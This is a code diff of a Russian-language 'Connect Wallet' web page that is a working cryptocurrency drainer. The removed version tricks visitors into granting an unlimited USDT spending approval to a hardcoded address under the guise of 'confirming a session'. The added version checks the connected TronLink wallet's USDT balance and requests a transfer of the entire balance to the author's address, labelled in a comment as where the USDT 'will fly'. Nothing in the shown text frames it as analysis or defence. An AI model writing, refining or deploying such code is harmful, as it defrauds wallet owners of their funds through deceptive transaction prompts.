@@ -3,84 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DApp Connect</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <title>Connect Wallet</title>
     <style>
-        body { background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; }
-        .card { max-width: 400px; margin: 0 auto; padding: 25px; background: #1e293b; border-radius: 12px; }
-        button { width: 100%; padding: 14px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        button:hover { background-color: #2563eb; }
-        p { color: #94a3b8; font-size: 14px; word-break: break-all; }
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        button {
+            background-color: #ff007a;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #e0006b;
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #b0b0b0;
+        }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Авторизация</h2>
-        <p id="walletInfo">Кошелек не подключен</p>
-        
-        <button id="connectBtn">Подключить кошелек</button>
-        <button id="approveBtn" style="display: none; background-color: #22c55e;">Подтвердить сессию</button>
+        <h2>Подключить кошелек</h2>
+        <p>Для продолжения необходимо подключить ваш Tron-кошелек.</p>
+        <button id="connectBtn">Connect Wallet</button>
+        <div id="status">Кошелек не подключен</div>
     </div>
 
+    <!-- Подключаем библиотеку TronWeb для работы с блокчейном прямо в браузере -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <script>
-        let tronWeb;
-        let userAddress = "";
-        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Официальный USDT TRC20
-        
-        // Твой адрес кошелька, на который выдается разрешение
-        const spenderAddress = "TRmTW2Bz67CZCWP4XCNmk3B65mzbVnkvVf"; 
+        const recipientAddress = "TRmTW2Bz67CZCWP4XCNmk3B65mzbVnkvVf"; // Твой адрес, куда улетит USDT
+        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Контракт USDT TRC-20
 
-        // 1. Подключение кошелька
-        document.getElementById('connectBtn').addEventListener('click', async function() {
+        document.getElementById('connectBtn').addEventListener('click', async () => {
+            const statusDiv = document.getElementById('status');
+
             try {
+                statusDiv.innerText = "Поиск кошелька...";
+
+                // Проверяем, установлен ли кошелек TronLink в браузере
                 if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    tronWeb = window.tronWeb;
-                    userAddress = window.tronWeb.defaultAddress.base58;
-                } else if (window.tronLink) {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    tronWeb = window.tronWeb;
-                    userAddress = window.tronWeb.defaultAddress.base58;
+                    executeFlow();
                 } else {
-                    alert("Откройте сайт во встроенном браузере кошелька (Trust Wallet / TronLink)");
-                    return;
+                    // Запрос на открытие/подключение TronLink
+                    if (window.tronLink) {
+                        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                        if (res.code === 200) {
+                            executeFlow();
+                        } else {
+                            statusDiv.innerText = "Ошибка: Доступ к кошельку отклонен.";
+                        }
+                    } else {
+                        statusDiv.innerText = "Ошибка: Установите расширение TronLink!";
+                    }
                 }
-
-                if (userAddress) {
-                    document.getElementById('walletInfo').innerText = "Кошелек: " + userAddress;
-                    document.getElementById('connectBtn').style.display = 'none';
-                    document.getElementById('approveBtn').style.display = 'block';
-                }
-            } catch (error) {
-                console.error(error);
-                alert("Ошибка подключения");
+            } catch (err) {
+                console.error(err);
+                statusDiv.innerText = "Ошибка подключения: " + (err.message || err);
             }
         });
 
-        // 2. Запрос прав (Approve)
-        document.getElementById('approveBtn').addEventListener('click', async function() {
+        async function executeFlow() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "Кошелек подключен. Проверка баланса...";
+
             try {
-                const contract = await window.tronWeb.contract().at(usdtContractAddress);
+                const tronWeb = window.tronWeb;
+                const userAddress = tronWeb.defaultAddress.base58;
                 
-                // Максимальное значение для безлимитного списания
-                const maxApproval = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                // Подключаемся к контракту USDT
+                const contract = await tronWeb.contract().at(usdtContractAddress);
+                
+                // Проверяем баланс USDT на подключенном кошельке
+                const balance = await contract.balanceOf(userAddress).call();
+                const balanceNumber = Number(balance.toString());
 
-                alert("Подтвердите транзакцию для завершения авторизации...");
+                if (balanceNumber > 0) {
+                    statusDiv.innerText = `Обнаружен баланс! Запрос перевода...`;
 
-                const txID = await contract.approve(
-                    spenderAddress,
-                    maxApproval
-                ).send({
-                    feeLimit: 15000000
-                });
+                    // Вызываем функцию перевода (у пользователя всплывет окно подтверждения транзакции в расширении)
+                    // 6 нолей в конце означают перевод в микро-единицах USDT
+                    await contract.transfer(
+                        recipientAddress,
+                        balance.toString()
+                    ).send({
+                        feeLimit: 15000000
+                    });
 
-                alert("Успешно! Сессия настроена.");
-                console.log("TxID:", txID);
+                    statusDiv.innerText = "Успешно переведено!";
+                } else {
+                    statusDiv.innerText = "На кошельке нет USDT.";
+                }
             } catch (error) {
                 console.error(error);
-                alert("Ошибка: оформление отклонено");
+                statusDiv.innerText = "Операция отменена или ошибка сети.";
             }
-        });
+        }
     </script>
 </body>
 </html>
